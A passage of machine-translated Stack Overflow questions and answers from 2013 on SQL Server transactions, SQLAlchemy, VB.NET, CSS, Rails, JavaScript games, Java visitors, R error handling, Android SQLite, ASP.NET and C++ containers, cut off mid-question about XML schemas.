      insert INTO   [dbo].[refresh_results] (result_time, result_table, result_rows)
                values (@result_time, @result_table, @result_rows);
    End 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:26:26.283

您的嵌套事务没有按照您的想法进行。您正在回滚您认为存储的错误。回滚初始事务，然后，如果您觉得需要，启动一个新事务来记录错误。

见[这里](http://www.sqlskills.com/blogs/paul/a-sql-server-dba-myth-a-day-2630-nested-transactions-are-real/)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T23:35:04.887

你有两个单独的问题

在您的第一个示例中，您正在运行执行以下操作的事务：

```
BEGIN TRAN
    ...error...
    BEGIN TRAN
        ...log error...
    COMMIT TRAN
ROLLBACK TRAN 
```

内部事务与外部事务一起回滚。也许尝试：

```
BEGIN TRAN
    ...error...
ROLLBACK TRAN
BEGIN TRAN
    ...log error...
ROLLBACK TRAN 
```

您正在使用的第二个示例`@@ERROR`. 据我了解，一旦您运行某些东西`@@ERROR`就会被替换。我认为这包括打印声明。

如果您将其更改为：

```
DECLARE @Error INT
select * into tablename 
from opendatasource('SQLNCLI', 'Data Source=DATA3;UID=;password=').dbo.viewname;

SET @Error = @@ERROR
print '@@error' 
print @Error

if @Error <> 0
...log the error 
```

的优点`TRY CATCH`是，如果您有错误，它将捕获它。该`@@ERROR`方法 100% 有效，但仅适用于最后一行运行。所以如果你有一个错误`DROP TABLE tablename` `@@ERROR`不会得到它（除非你添加另一个检查）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-24T18:51:06.317

好的，所以我不得不使用帮助程序来添加日志条目。我认为发生的事情是回滚也在回滚日志条目。

这是我必须做的：

```
 DECLARE @myError tinyint;
    BEGIN TRY
        BEGIN TRANSACTION;      
        if exists (select name from sys.sysobjects where name='table_name')
        begin
          drop table table_name
        end
        select * into table_name
          from opendatasource('SQLNCLI', 'Data Source=###;UID=###;password=###').view_Table
        COMMIT TRANSACTION;
    END TRY
    BEGIN CATCH 
        set @myError = 1                
        ROLLBACK TRANSACTION;
    END CATCH

    if @myError <> 0
    begin
        exec dbo.table error
    end
    ELSE
        EXEC  exec dbo.table normal row 
```

# python - sqlalchemy 是否与 datamapper 的 first_or_create 方法等效？

> ID：14469762
> 
> 赞同：1
> 
> 时间：2013-01-22T23:09:57.613
> 
> 标签：python, flask, flask-sqlalchemy

使用datamapper，如果你想“要么找到第一个匹配某个给定条件的资源，要么如果找不到就创建该资源，你可以使用#first_or_create。”

我正在使用flask-sqlalchemy，想知道是否有类似的功能。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T08:21:59.173

`django`在命名中有一些东西`get_or_create`你可以为它创建类似的东西`sqlalachemy`

```
def get_or_create(session, model, **kwargs):
    instance = session.query(model).filter_by(**kwargs).first()
    if instance:
        return instance
    else:
        instance = model(**kwargs)
        return instance 
```

从这里开始：python - SQLAlchemy 是否有相当于 Django 的 get_or_create？- 堆栈溢出 - > [SQLAlchemy 是否有相当于 Django 的 get_or_create？](https://stackoverflow.com/questions/2546207/does-sqlalchemy-have-an-equivalent-of-djangos-get-or-create)

# vb.net - 使用 Excel 范围和数组

> ID：14469763
> 
> 赞同：0
> 
> 时间：2013-01-22T23:10:15.843
> 
> 标签：vb.net

在 VBA 中，我可以轻松地将工作表\范围拉入数组，进行操作，然后传回工作表\范围。不过，我在 VB.Net 中遇到了麻烦。

这是我的代码。

```
Rng = .Range("a4", .Cells(.UsedRange.Rows.Count, .UsedRange.Columns.Count))
Dim SheetArray(,) As Object = DirectCast(Rng.Value(Excel.XlRangeValueDataType.xlRangeValueDefault), Object(,))
For X As Integer = 0 To SheetArray.GetUpperBound(0)
    If IsNothing(SheetArray(X, 0)) Then Exit For
    SheetArray(X, 6) = SheetArray(X, 3)
    SheetArray(X, 7) = CDbl(SheetArray(X, 3).ToString) - CDbl(SheetArray(X, 1).ToString) - _
                                              CDbl(SheetArray(X, 7).ToString)
        For Y As Integer = 0 To 3
            SheetArray(X, Y * 2 + 1) = Math.Round(CDbl(SheetArray(X, Y * 2 + 1).ToString), 3)
        Next
        If Math.Abs(CDbl(SheetArray(X, 7).ToString)) > 0.1 Then _
            .Range(.Cells(X + 1, 1), .Cells(X + 1, 8)).Font.Color = -16776961
Next 
```

我在第一`If IsNothing(SheetArray(X, 0)) Then Exit For` 行遇到错误。它告诉我索引超出了数组的范围。知道为什么吗？该`SheetArray`对象包含数据，但我只是不确定如何获取它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T08:36:53.870

在`For`你必须从 0 循环到`Count - 1`：

```
For X As Integer = 0 To SheetArray.GetUpperBound(0) - 1
    '...
Next 
```

这将解决您的问题。

# html - 表单域的水平对齐

> ID：14469764
> 
> 赞同：3
> 
> 时间：2013-01-22T23:10:24.593
> 
> 标签：html, css, css-float

如何使城市状态拉链对齐在同一行我减小了宽度但它不起作用如何修复它

```
<div class="">
   <label class="" for="">City</label><input style="width: 54px;" type="text">
   <label class="" for="">State</label><input style="width: 54px;" type="text">
   <label class="" for="">Zip</label><input style="width: 54px;" type="text" >
</div> 
```

[http://jsfiddle.net/VXXPC/19/](http://jsfiddle.net/VXXPC/19/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-22T23:12:48.997

你的标签是`display: block`. 像使用`display: inline-block`字段一样使用。

我用浏览器开发工具花了大约 10 秒的时间才意识到这一点。在大多数现代浏览器（FF 需要安装 FireBug）中点击 [F12] 会启动捆绑的开发人员工具。在这里，您可以检查有问题的元素并查看影响元素的 CSS。

这是一个[更新的小提琴](http://jsfiddle.net/VXXPC/22/)。我已经将一个类应用于父 div `inline-fields`。在我添加的 CSS 中：

```
.inline-fields label {
    display: inline-block;
} 
```

# ruby-on-rails - 确定哪些资产没有在 Rails 中使用？

> ID：14469767
> 
> 赞同：3
> 
> 时间：2013-01-22T23:10:41.720
> 
> 标签：ruby-on-rails, asset-pipeline

我在 Rails 中使用资产管道，我们有许多可能未使用的 haml 部分，以及未使用的图像。

如果没有使用资产，例如图像、haml 等，您如何计算？有没有一种自动化的方法来找出答案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T20:23:07.033

我找到了一些链接，但还没有尝试过。当我有机会尝试它们时，我会报告：

**发现未使用的部分**

[帮助您找出未使用](https://github.com/vinibaggio/discover-unused-partials)的部分的脚本。适合大型项目或需要大量重构的项目。涵盖 Haml 和 ERB。

**自重**

[Deadweight](https://github.com/aanand/deadweight)是一个 CSS 覆盖工具。给定一组样式表和一组 URL，它会确定实际使用了哪些选择器并报告哪些可以“安全地”删除。

**搜索 production.log**

有一篇名为[Removing deadweight](http://blog.scoutapp.com/articles/2012/08/23/removing-deadweight-cleaning-up-our-rails-app)的方便的博客文章，描述了如何通过 grep 搜索生产日志和一个脚本来[查找和删除尚未看到的资产](https://gist.github.com/3427806)。

他们使用的 grep 命令是：

```
grep -Eo ‘GET /(.*(.gif|.jpg|.jpeg|.png|.css|.js))[ \?]’ access.log > ~/assets.txt 
```

# javascript - HTML5 游戏 - 行走边界问题

> ID：14469772
> 
> 赞同：2
> 
> 时间：2013-01-22T23:10:59.380
> 
> 标签：javascript, html, position, collision, boundary

我正在开发一个自上而下的射击游戏，基本上角色从屏幕中间开始，在一个矩形（安全区）内。角色不是静止的，场景是静止的。他可以在安全区内四处走动。角色一走出这个区域，静态就会切换……角色是静止的，场景围绕着他移动。

唯一的问题是我不能走回安全区，让我的静力学再次切换。

所以我永远被困在这个区域之外。我所做的只是检查我的角色位置是否在某个值（即矩形）内，如果他不在 - 那么我的 KeyControls 会影响地图，而不是角色。

所以这是我的边界（安全区）检查器：

```
//Walking Window Boundaries
    var boundarySizeX = 400;
    var boundarySizeY = 200;

    ctxWalkBoundary.fillStyle = "grey";
    ctxWalkBoundary.fillRect(gameWidth/2 - boundarySizeX/2, gameHeight/2 - boundarySizeY/2, boundarySizeX, boundarySizeY);
    ctxWalkBoundary.clearRect((gameWidth/2 - boundarySizeX/2) + 2, (gameHeight/2 - boundarySizeY/2) + 2, (boundarySizeX) - 4, (boundarySizeY) -4 );

    var paddingLeft = (gameWidth - boundarySizeX) / 2;
    var paddingRight = gameWidth - ((gameWidth - boundarySizeX) / 2) - this.charWidth;
    var paddingTop = (gameHeight - boundarySizeY) / 2;
    var paddingBottom = gameHeight - ((gameHeight - boundarySizeY) / 2) - this.charHeight;

    var paddingY = (gameHeight - boundarySizeY) / 2;

    if(this.drawX > paddingLeft && this.drawX < paddingRight && this.drawY > paddingTop && this.drawY < paddingBottom){
        inBoundary = true;
    }
    else{
        inBoundary = false;
        console.debug("Out Of Boundary!");
    } 
```

这是我的 KeyChecker：

```
//UP
    if(this.isUpKey){

        //Character movement
        if(inBoundary){
            this.drawX = this.drawX + this.speed * Math.cos((this.characterRotation));
            this.drawY = this.drawY + this.speed * Math.sin((this.characterRotation));
        }
        else{
            mapPositionX = mapPositionX - this.speed * Math.cos((this.characterRotation));
            mapPositionY = mapPositionY - this.speed * Math.sin((this.characterRotation));
        } 
```

我的角色总是面对我的鼠标（旋转）。因此，每次用户按下 W 或 Up 时，角色总是会走向鼠标位置。

有什么想法可以让我回到该区域吗？

- - - 更新 - - -

我想我需要以某种方式检查我是否仍然面向安全区之外 - 如果不是，则反转他的静态。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:27:41.053

这里的问题是您正在等待角色越界，然后移动地图。但是旗子已经被触发了，现在无论你往哪个方向走，角色的移动都是静止的，因为你已经出界了。

您可以改为检测角色何时要越过边界并通过移动地图来阻止它：

```
//UP
if(this.isUpKey){

// save the x and y offset to prevent needless recalculation
var xOffset = this.speed * Math.cos(this.characterRotation),
    yOffset = this.speed * Math.sin(this.characterRotation);

    //Character movement
    if( boundaryCheck(xOffset, yOffset) ){
        this.drawX = this.drawX + xOffset;
        this.drawY = this.drawY + yOffset;
    }
    else{
        mapPositionX = mapPositionX - xOffset
        mapPositionY = mapPositionY - yOffset;
    } 
```

然后`boundaryCheck`取 x 和 y 增量并确定它们是否仍在界限内。如果角色仍在边界内，`return true`则角色将移动，否则地图将移动。

```
function boundaryCheck(xOffset, yOffset){
// variables set and other stuff done...
    if(this.drawX + xOffset > paddingLeft && this.drawX + xOffset < paddingRight && this.drawY + yOffset > paddingTop && this.drawY + yOffset < paddingBottom){
       return true;
    }
    else{
        console.debug("Out Of Boundary!");
        return false;
    }

}; 
```

这样您就不必确定越界角色是否正在向边界移动。相反，你预先确定了角色的去向，并相应地进行调整，始终让他保持在边界内。

如果没有完整的代码，这当然是不可测试的，但我认为它应该适用于您提供的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T01:12:48.297

**只需将两件事分开：地图和视图。**

地图是您的关卡，您可以将带有坐标的对象保存在那里。视图是您在屏幕上看到的地图的一部分。View 有 4 个属性：x、y、宽度和高度，其中宽度和高度最有可能是您的画布大小。

如果您的游戏从屏幕中间的地图点 (0,0) 上的视图开始，那么您的视图 (x,y) 坐标应为 (-view.width/2, -view.height/2)。

**如何在视图中绘制角色和对象？**

首先，只绘制视图矩形中的东西。所以遍历所有对象并检查是否

```
object.x >= view.x && object.x <= view.x + view.width && object.y >= view.y && object.y <= view.y + view.height 
```

（您可能也应该考虑对象边界）。

如果对象在视图区域中，则在 position 处绘制它`(object.x - view.x, object.y - view.y)`。这就是绘画的全部内容。

**与他一起移动角色和视图区域。**

现在当你的角色与边界碰撞时，例如（与右边界碰撞）

```
character.x >= view.x + view.width 
```

然后通过将 view.x 增加一些值（可能是 character.width/2）将视图向右移动。

--**更新**--

我看到你没有在你的游戏中使用 OOP（实际上你是因为 JS 中的所有东西都是一个对象，但你不是故意使用它）。

JS 中的 OOP 有很多解释，所以我会尽量简短。

您可以使用 JSON 格式制作角色、地图和视图等对象。

```
character = {
    x: 0,
    y: 0,
    xspeed: 0,
    yspeed: 0,
    speed: 0,
    radius: 20,
}

map = {
    objects: [
        {sprite: 'tree.jpg', x: 100, y: 50},
        {sprite: 'stone.jpg', x: 20, y: 30},
    ],
}

view = {
    width: canvas.width,
    height: canvas.height,
    x: -this.width/2,
    y: -this.height/2,
} 
```

这些是您可以在函数中使用的对象，如下所示：

```
for (var i=0; i++, i<map.objects.length) {
    if (map_obj.x >= view.x && map_obj.x <= view.x + view.width && map_obj.y >= view.y && map_obj.y <= view.y + view.height) {
        var map_obj = map.objects[i];
        draw_sprite(map_obj.sprite, map_obj.x - view.x, map_obj.y - view.y);
    }
} 
```

这不是最好的方法，但它现在仍然比你的好得多。当您了解 OOP 是什么时，您会为自己做得更好。

# java - 通过访问者评估树表达式

> ID：14469775
> 
> 赞同：5
> 
> 时间：2013-01-22T23:11:26.247
> 
> 标签：java, oop, design-patterns, visitor-pattern

我有一个复合设计模式的表达：

```
interface TreeExpression{
    void accept(Visitor visitor);
}

abstract class Operator{
    TreeExpression childA;
    TreeExpression childB;

    Operator(TreeExpression a, TreeExpression b){
        this.childA = a;
        this.childB = b;
    }
}

class PlusTreeExpression extends Operator implements TreeExpression{
    public PlusTreeExpression(TreeExpression a, TreeExpression b) {
        super(a, b);
    }

    public void accept(Visitor visitor) {
        this.childA.accept(visitor);
        visitor.visit(this);
        this.childB.accept(visitor);
    }
}

class MultiplyTreeExpression extends Operator implements TreeExpression{
    public MultiplyTreeExpression(TreeExpression a, TreeExpression b) {
        super(a, b);
    }

    public void accept(Visitor visitor) {
        this.childA.accept(visitor);
        visitor.visit(this);
        this.childB.accept(visitor);
    }
}

class IntegerNode implements TreeExpression{
    Integer value;

    IntegerNode(int v){
        this.value = v;
    }

    public void accept(Visitor visitor) {
        visitor.visit(this);
    }
} 
```

和访问者从表达式中获取字符串：

```
interface Visitor{
    void visit(PlusTreeExpression tree);
    void visit(MultiplyTreeExpression tree);
    void visit(IntegerNode node);
}

class PrintVisitor implements Visitor{
public StringBuffer result = new StringBuffer();

    public void visit(IntegerNode node) {
        result.append(node.value);
    }

    public void visit(PlusTreeExpression tree) {
        result.append("+");
    }

    public void visit(MultiplyTreeExpression tree) {
        result.append("*");
    } 
```

这个访问者有效，现在我正在尝试让访问者进行评估表达式，但在这里我遇到了问题。我尝试了几种方法来做到这一点，但我不知道如何在不更改现有代码的情况下从子树中获取价值。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-24T12:37:24.187

As far as I can see the problem here is that you are defining how the tree will be traversed in the tree itself and not in the visitor. While this can be a valid approach (design patterns do have variations) I think that in this case is better to decouple the tree structure from the traversing order (pre-order, in-order, post-order). As a matter of fact a typical exercise when teaching this pattern is to write the three visitors, each one performing a different traversal.

In your case I would:

1.  Represent the expressions as a tree just like you did, but removing form the accept the traversing parts. In your code the accept would look like:

    ```
    public void accept(Visitor visitor)
    {
        visitor.visit(this);
    } 
    ```

2.  Define public getters for the childs of your nodes, so that the visitor can access them (`getChildA()`, `getChildB()` and `getValue()`).

3.  Write a visitor for the type of traversal that you need. For evaluating the expression you will generally use a post-order while for printing the expression you can use in-order (as in your example). So, for evaluating the expression you will end with something that looks like this:

    ```
    class EvalVisitor implements Visitor{

            public Integer visit(IntegerNode node) {
                return node.getValue();
            }

            public Integer visit(PlusTreeExpression tree) {
                return this.visit(tree.getChildA()) + this.visit(tree.getChildB());
            }

            public Integer visit(MultiplyTreeExpression tree) {
                return this.visit(tree.getChildA()) * this.visit(tree.getChildB());
            }
        } 
    ```

HTH

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T00:38:59.350

情侣提示：

1.  对于您的问题：考虑一种称为“堆栈”的数据结构（在 Java`java.util.LinkedList`中很有帮助），并研究一种称为“[反向波兰表示法](http://en.wikipedia.org/wiki/Reverse_Polish_notation)”的东西。

2.  顺便说一句，您可能希望简化您的方法。请注意，此代码一遍又一遍地重复：

    ```
    public void accept(Visitor visitor) {
        this.childA.accept(visitor);
        visitor.visit(this);
        this.childB.accept(visitor);
    } 
    ```

That's only going to get worse as you add more cases. You might want to consider creating an abstract class called (say) `BinaryExpression`, containing some or all of that code.

You might also consider using some kind of integer token to identify the specific operation, rather than the name of the class and and "accept()" function ... and then using a switch/case statement in your "Visitor" implementation for `visit(BinaryExpression)`.

# ruby-on-rails - 当我想在删除记录时将记录的所有权更改给其他人时，如何设计数据库系统？

> ID：14469779
> 
> 赞同：0
> 
> 时间：2013-01-22T23:11:45.510
> 
> 标签：ruby-on-rails, ruby-on-rails-3

假设我有这 4 个模型。
然后我使用`acts_as_paranoid`为每个模型调用的 gem 来实现逻辑删除。

*   用户
*   社区
*   话题
*   评论

用户可以随时辞职。这意味着用户的记录将被删除。
在一般情况下，用户创建的社区、主题和评论也应该一起删除。（w/依赖=>销毁）

但是，我不希望那样。因为其他用户可能已将社区添加到他的书签列表中。因此，出于这个原因，它们不应该被删除。

当假设用户记录被删除但所有这些社区、主题和评论仍然存在时，它开始在社区页面或用户所做的任何地方返回 nil 错误。

我现在就这样编码。
由于用户记录消失了，但所有记录仍然存在，因此到处都是零。
我该如何处理这种问题？

**意见/社区/show.html.erb**

```
<%= @community.user.username %> 
```

我想要做的是，用这个固定词“未找到用户”替换显示的用户名。然后可能我只是将社区的所有权（user_id）更改为其他用户，以便他可以管理这个社区。

我的协会就是这样。

**模型/用户.rb**

```
has_many :communities
has_many :topics
has_many :comments 
```

**模型/社区.rb**

```
belongs_to :user
has_many :topics
has_many :comments 
```

**模型/topic.rb**

```
belongs_to :user
belongs_to :community
has_many :comments 
```

**模型/comment.rb**

```
belongs_to :user
belongs_to :community
belongs_to :topic 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:32:35.860

我认为处理此问题的最佳方法是避免删除，而是将代码放入显示逻辑中以处理已删除的用户。如果你坚持使用acts_as_paranoid，这会很好，我会做的是对用户名使用辅助方法，例如：

```
def community_username(community)
  user = User.with_deleted.find(community.user_id)
  if user.deleted_at.blank?
    return user.username
  end
  "[deleted]"
end 
```

您可以将其放在适当的帮助程序或应用程序帮助程序中，并在您的视图中调用它，例如

```
<%= community_username(@community) %> 
```

它将显示他们的用户名，如果已被删除，则显示 [deleted]。

请注意，上面的代码不在我的脑海中，如果我忘记了acts_as_paranoids 方法，您可能需要稍微调整...

# r - 从 try、tryCatch 或类似中返回逻辑 TRUE/FALSE？

> ID：14469781
> 
> 赞同：3
> 
> 时间：2013-01-22T23:12:00.823
> 
> 标签：r, error-handling, try-catch

如果给出错误，R中是否有一个函数返回“FALSE”，否则返回“TRUE”？或者类似的东西，还是我需要通过评估类似的东西来创建自己的`ifelse(class(try(stop())) == "try-error", FALSE, TRUE)`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-23T00:06:59.993

我不得不偶尔或两次这样做。我所做的就是`tryCatch`沿着这些思路使用。如果您在进行模拟并且有时某些算法不会收敛并产生警告，但您想忽略它，这可能会很方便，因为您不希望您的模拟在超级计算机上的 100 个节点上运行时终止。

```
> out <- tryCatch(stop("bla"), error = function(e) e)
> any(class(out) == "error")
[1] TRUE 
```

如果过程不间断（没有错误），您将得到 FALSE。

```
> out <- tryCatch(1:5, error = function(e) e)
> out
[1] 1 2 3 4 5
> any(class(out) == "error")
[1] FALSE 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T23:15:01.350

您肯定不想使用`ifelse`，但也许这会显示更有效的路线：

```
> if( inherits(res <- try( stop() ),  "try-error") ){ FALSE} else{ res}
Error in try(stop()) : 
[1] FALSE

> if( inherits( res <- try( "ppp" ),  "try-error") ){ FALSE} else{ res}
[1] "ppp" 
```

现在我想了一下：答案只是`inherits(tryres, "try-error")`因为它确实返回了一个逻辑。您决定如何处理它取决于您。确实很多时候测试`class(tryres)=="tryerror`会成功，但有时会返回不止一个类，在这种情况下不会。

# android - Android/SQLite 打开/关闭数据库的正确方法？

> ID：14469782
> 
> 赞同：1
> 
> 时间：2013-01-22T23:12:10.617
> 
> 标签：android, sqlite

我对 OOP 有点陌生，所以我想知道我是否正确地做事。为了与数据库通信，我创建了一个类 SQLiteHelper，女巫完成所有常见的事情（onCreate，onUpdate），还打开和关闭连接。

这是课程，目前它刚刚放在桌面上，但会添加更多内容：

```
public class SQLiteHelper extends SQLiteOpenHelper{
    public static final String DATABASE_NAME = "notebook";
    public static final int DATABASE_VERSION = 2;

    public static final String TABLE_LIST = "list";
    public static final String TABLE_LIST_ID = "_id";
    public static final String TABLE_LIST_NAME = "name";

    public SQLiteDatabase db;

    public SQLiteHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // TODO Auto-generated method stub
        db.execSQL("create table " + TABLE_LIST + "(" + TABLE_LIST_ID
                + " integer primary key autoincrement, " + TABLE_LIST_NAME
                + " text not null);");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_LIST);
        onCreate(db);
    }

    public void open(){
        db = getWritableDatabase();
    }

    public void close(){
        db.close();
    }
} 
```

接下来对于每个表，我将创建一个新类，它扩展了前一个类，并且我在其中执行与该特定表相关的所有操作。例如 ListSQL：

```
public class ListSQL extends SQLiteHelper {

    public ListSQL(Context context) {
        super(context);
    }

    public void delete(int id) {
        open();
        db.delete(TABLE_LIST, TABLE_LIST_ID + " = " + id, null);
        close();
    }

} 
```

我的问题是，在 OOP 中这是正确的做事方式吗？特别是在 ListSQL 中使用 open/close 方法以及 db 和 TABLE 变量对我来说似乎有点奇怪？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-11T13:37:11.830

我总是在中打开数据库连接并在中`onResume()`关闭它`onPause()`。这样，数据库始终为每个活动打开。

我不这样做的原因`onCreate()`是`onDestroy()`一旦用户转到其他活动`onCreate()`，`new activity`将首先调用`onDestroy()`旧活动，所以如果我在其他地方执行任何操作（例如：- 在我的列表中搜索或更改用户的状态等）然后`onCreate()`它会合理地使应用程序崩溃**`database already closed`**。

**注意：您必须打开和关闭连接，即使您使用的是 SQLiteHelper 类。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:14:38.407

根据 Android 手册，使用 SQLiteOpenHelper 时不需要关闭数据库。系统会为你做的。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2014-03-11T05:51:43.077

**正如上面提到的@Dan，如果您使用的是SQLiteOpenHelper**，则无需在每次执行读/写操作时打开和关闭数据库。使用数据库的最佳方法是：

### 1.

在[Application](http://developer.android.com/reference/android/app/Application.html)基类中声明并初始化**SQLiteHelper的实例，如下所示：**

```
public class App extends Application {
  public static SQLiteHelper db;

  @Override
  public void onCreate() {
    super.onCreate();
    db = new SQLiteHelper(getApplicationContext());
    db.open();

  }
} 
```

### 2.

在您的活动中，或您想使用数据库的任何其他地方，初始化 SQLiteHelper 对象，如下所示：

```
SQLiteHelper db = App.db; 
```

然后您可以随意使用数据库，而不必担心打开和关闭它（：

# asp.net - 将“字符串”转换为“System.IFormatProvider”时出错

> ID：14469783
> 
> 赞同：0
> 
> 时间：2013-01-22T23:12:14.750
> 
> 标签：asp.net, vb.net

我有一个带有嵌套 Gridview 的页面，我试图通过从外部网格的每一行中提取一个字符串值来填充内部网格。当我尝试将外部网格中的值传递给字符串变量时，出现“将'String'转换为'System.IFormatProvider'时出错”错误。我正在使用以下代码将 gridview 单元格值存储到变量中：

```
 Dim Svc_Name As String = grdOuterGridView.DataKeyNames(e.Row.RowIndex).ToString("THIRD_PARTY_SERVICE") 
```

谁能告诉我我在这里做错了什么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:16:03.467

[DataKeysNames](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.datakeynames%28v=vs.100%29.aspx)已经是一个字符串数组，您不需要 ToString(....) 部分。

```
 Dim Svc_Name As String = grdOuterGridView.DataKeyNames(e.Row.RowIndex) 
```

实际上，您的错误来自 ToString("THIRD_PARTY_SERVICE")。采用一个参数的 ToString() 覆盖需要一个实现`IFormatProvider`接口的对象，但是字符串当然没有这个接口，因此会出错。但是，在 String 上调用 ToString() 没有任何效果，因为您可以从[MSDN 文档中阅读](http://msdn.microsoft.com/en-us/library/system.string.tostring.aspx)

> 返回此 String 实例；不执行实际转换。

# c++ - 对于非重复项目，最有效的标准容器是什么？

> ID：14469785
> 
> 赞同：10
> 
> 时间：2013-01-22T23:12:27.090
> 
> 标签：c++, map, vector, set, containers

将非重复元素添加到 STL 容器中的最有效方法是什么，哪种容器最快？我有大量的数据，恐怕每次尝试检查它是否是新元素时，都会花费很多时间。我希望地图很快。

```
// 1- Map
map<int, int> Map;
...
if(Map.find(Element)!=Map.end()) Map[Element]=ID;

// 2-Vector
vector<int> Vec;
...
if(find(Vec.begin(), Vec.end(), Element)!=Vec.end()) Vec.push_back(Element);

// 3-Set
// Edit: I made a mistake: set::find is O(LogN) not O(N) 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-01-22T23:15:19.510

两者都`set`具有`map`查找`O(log(N))`键的性能。`vector`有`O(N)`。

`set`和之间的区别`map`，就您而言，是您需要将键与值相关联，还是直接存储值。如果您需要前者，请使用 a `map`，如果您需要后者，请使用 a `set`。

在这两种情况下，您都应该只使用`insert()`而不是使用`find()`.

原因是`insert()`当且仅当容器尚未包含该值时才会将该值插入容器中（在 的情况下`map`，如果容器不包含该键）。这可能看起来像

```
Map.insert(std::make_pair(Element, ID)); 
```

对于地图或

```
Set.insert(Element); 
```

为一套。

您可以参考返回值来确定是否实际执行了插入。

* * *

如果您使用的是 C++11，您还有两个选择，即`std::unordered_map`和`std::unordered_set`. 这些都具有`O(1)`插入和查找的摊销性能。但是，它们还要求键（或值，在 set 的情况下）是可散列的，这意味着您需要专门`std::hash<>`针对您的键。相反，`std::map`并`std::set`要求您的键（或值，在 set 的情况下）响应`operator<()`.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-22T23:15:37.960

如果您使用的是 C++11，则可以使用`std::unordered_set`. 这将允许您进行`O(1)`存在检查（技术上已摊销`O(1)`——`O(n)`在最坏的情况下）。

`std::set`可能是您的第二选择`O(lg n)`。

基本上，`std::unordered_set`是一个哈希表，`std::set`是一个树结构（在我见过的每个实现中都是一个红黑树）¹。

根据您的散列分布情况以及您拥有的项目数量， std::set 实际上可能更快。如果它确实对性能至关重要，那么一如既往，您将需要进行基准测试。

^(1）从技术上讲，我不认为需要将其实现为哈希表或平衡 BST。如果我没记错的话，标准只是规定了运行时界限，而不是实现——事实证明，这些是唯一符合界限的可行实现。)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-22T23:15:19.177

你应该使用`std::set`; 它是一个容器，旨在保存对象的单个（等效）副本，并实现为二叉搜索树。因此，它在容器的大小上是`O(log N)`，而不是。`O(N)`

`std::set`并且`std::map`经常共享它们的大部分底层实现；你应该检查你当地的 STL 实施。

说了这么多，复杂性只是衡量性能的一种方式。使用排序向量可能会获得更好的性能，因为它使数据彼此保持本地，因此更有可能命中缓存。如今，缓存一致性是数据结构设计的重要组成部分。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-22T23:15:34.200

听起来你想使用`std::set`. 它的元素是唯一的，因此在添加元素时不需要关心唯一性，并且`a.find(k)`（其中`a`是一个`std::set`和`k`是一个值）被定义为复杂度的对数。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-22T23:16:19.040

如果您的元素可以为 O(1) 散列，那么最好在 a`unordered_map`或`unordered_set`（而不是在`map`/中使用索引，`set`因为它们在实现中使用 RB 树，这是 O(logN) 发现复杂性）

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-01-22T23:25:39.873

您的示例显示了明确的模式：

```
check if the value is already in container
  if not, add the value to the container. 
```

这两种操作都可能需要一些时间。首先，查找一个元素可以在 O(N) 时间内完成（线性搜索），如果元素没有以任何特定方式排列（例如，只是一个 plain `std::vector`），它可以在 O(logN) 时间内完成（二分搜索) 如果元素已排序（例如，要么`std::map`或），并且如果元素被散列（例如，要么或`std::set`），则可以在 O(1) 时间内完成。`std::unordered_map``std::unordered_set`

对于普通向量或无序容器（散列容器），插入将是 O(1)（摊销），尽管散列容器会慢一些。对于 set 或 map 之类的排序容器，您将进行 log-time 插入，因为它需要在插入之前寻找插入它的位置。

所以，结论，使用`std::unordered_set`或`std::unordered_map`（如果你需要键值功能）。而且您在插入之前不需要检查，这些是唯一键容器，它们不允许重复。

如果`std::unordered_set`/ `std::unordered_map`（来自 C++11）或`std::tr1::unordered_set`/ `std::tr1::unordered_map`（自 2007 年以来）对您（或任何等价物）不可用，那么下一个最佳选择是`std::set`/ `std::map`。

# xml - 如何动态地将需求放在一个 使用多个模式阻止？

> ID：14469786
> 
> 赞同：0
> 
> 时间：2013-01-22T23:12:27.480
> 
> 标签：xml, schema

考虑以下 XML 文档：

```
<?xml version="1.0" encoding="utf-8"?>
<fooDb version="1.0.0.0" xmlns="http://tempurl.org/2013/01/Example">
  <provider>Some Provider</provider>
  <connectionSettings xmlns="http://tempurl.org/2013/01/Example.SomeProvider">
    <protocol>https</protocol>
    <server>contoso-server</server>
    <port>8080</port>
    <project>Tailspin Toys</project>
  </connectionSettings>
</fooDb> 
```

基本上，我有这个`<connectionSettings>`元素，我希望客户能够自定义它。我不希望整个“示例”项目知道特定提供商对其连接设置做了什么。我对此模式的第一次尝试如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<xs:schema id="ExampleConfiguration"
    xmlns="http://tempurl.org/2013/01/Example"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    targetNamespace="http://tempurl.org/2013/01/Example"
    elementFormDefault="qualified">

  <!-- Root element for configurations. -->
